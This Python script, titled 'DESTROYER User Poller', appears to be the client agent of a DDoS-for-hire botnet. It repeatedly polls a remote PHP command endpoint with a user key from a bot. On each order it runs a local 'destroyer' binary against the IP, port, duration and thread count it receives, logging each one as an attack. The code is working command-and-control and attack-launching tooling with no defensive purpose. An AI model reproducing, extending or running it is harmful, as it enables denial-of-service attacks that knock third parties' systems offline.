#!/usr/bin/env python3
"""
DESTROYER User Poller
- Uses your unique key from bot
- Polls PHP API and executes destroyer with EXACT params
"""

import asyncio
import aiohttp
import os
import sys

# ===== CONFIG =====
API_BASE = "https://geekerguys.com/fuck.php"

# PASTE YOUR UNIQUE KEY FROM BOT HERE
YOUR_KEY = "PASTE_YOUR_KEY_HERE"  # e.g. "a1b2c3d4e5f67890abcdef1234567890"

POLL_INTERVAL = 2      # seconds
BINARY_NAME   = "destroyer"
BINARY_TIMEOUT = 120   # seconds


async def poll_attack(session: aiohttp.ClientSession):
    """
    Poll your API endpoint:
    GET fuck.php?key=YOUR_KEY&ip=...&port=...&time=...&threads=...
    """
    url = f"{API_BASE}?key={YOUR_KEY}"
    try:
        async with session.get(url, timeout=10) as resp:
            if resp.status != 200:
                return None

            # Expect JSON from PHP
            data = await resp.json(content_type=None)
            if data.get("status") == "ok":
                # Must contain the same params the user sent
                return {
                    "ip":      str(data.get("ip")),
                    "port":    int(data.get("port")),
                    "time":    int(data.get("time")),
                    "threads": int(data.get("threads", 5000)),
                }
    except Exception as e:
        print(f"
[ERROR] poll_attack: {e}")
    return None


async def run_destroyer(ip: str, port: int, time_sec: int, threads: int):
    """
    Execute ./destroyer ip port time threads with EXACT values from API.
    """
    if not os.path.isfile(BINARY_NAME):
        print(f"
[ERROR] Binary '{BINARY_NAME}' not found in current directory")
        return

    if not os.access(BINARY_NAME, os.X_OK):
        print(f"[INFO] Making '{BINARY_NAME}' executable (chmod +x)")
        try:
            os.chmod(BINARY_NAME, 0o755)
        except Exception as e:
            print(f"[ERROR] chmod failed: {e}")
            return

    cmd = [f"./{BINARY_NAME}", ip, str(port), str(time_sec), str(threads)]
    print(f"
[EXEC] {' '.join(cmd)}")

    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )

        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), BINARY_TIMEOUT)
        except asyncio.TimeoutError:
            print("[TIMEOUT] destroyer took too long, killing...")
            proc.kill()
            return

        if stdout:
            print("[STDOUT]")
            print(stdout.decode(errors="ignore"))

        if stderr:
            print("[STDERR]")
            print(stderr.decode(errors="ignore"))

        print(f"[DONE] destroyer exit code: {proc.returncode}")
    except Exception as e:
        print(f"[ERROR] running destroyer: {e}")


async def main():
    if YOUR_KEY == "PASTE_YOUR_KEY_HERE":
        print("[FATAL] Set YOUR_KEY in this script to your key from the bot.")
        sys.exit(1)

    print(f"[START] DESTROYER poller for key: {YOUR_KEY}")
    print(f"[POLL ] {API_BASE}?key={YOUR_KEY}")
    print("[INFO ] Press Ctrl+C to stop")

    async with aiohttp.ClientSession() as session:
        while True:
            try:
                attack = await poll_attack(session)
                if attack:
                    print("
[ATTACK RECEIVED]")
                    print(f"  IP     : {attack['ip']}")
                    print(f"  Port   : {attack['port']}")
                    print(f"  Time   : {attack['time']} s")
                    print(f"  Threads: {attack['threads']}")

                    await run_destroyer(
                        attack["ip"],
                        attack["port"],
                        attack["time"],
                        attack["threads"],
                    )
                else:
                    # No valid attack, silent heartbeat
                    print(".", end="", flush=True)

                await asyncio.sleep(POLL_INTERVAL)

            except KeyboardInterrupt:
                print("
[STOP] Poller stopped by user")
                break
            except Exception as e:
                print(f"
[LOOP ERROR] {e}")
                await asyncio.sleep(5)


if __name__ == "__main__":
    asyncio.run(main())